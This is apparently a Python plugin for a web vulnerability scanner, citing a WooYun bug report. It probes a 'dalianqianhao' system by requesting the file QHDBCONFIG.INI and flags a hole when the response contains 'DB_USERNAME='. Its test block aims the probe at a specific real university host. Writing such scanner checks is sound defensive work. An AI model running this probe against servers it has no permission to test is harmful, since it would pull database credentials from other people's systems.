#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 01001000entai
#_PlugName_ = qianhao .ini
#__Refer___ = http://www.wooyun.org/bugs/wooyun-2010-063453

import re

def assign(service, arg):
	if service == 'dalianqianhao':
		return True, arg

def audit(arg):
    payload = 'QHDBCONFIG.INI'
    target = arg + payload
    code, head, body, errcode, final_url = curl.curl2(target);
    if code == 200 and 'DB_USERNAME=' in body:
        security_hole(target)

if __name__ == '__main__':
	from dummy import *
	audit(assign('dalianqianhao', 'http://cityjw.dlut.edu.cn:7001/')[1])                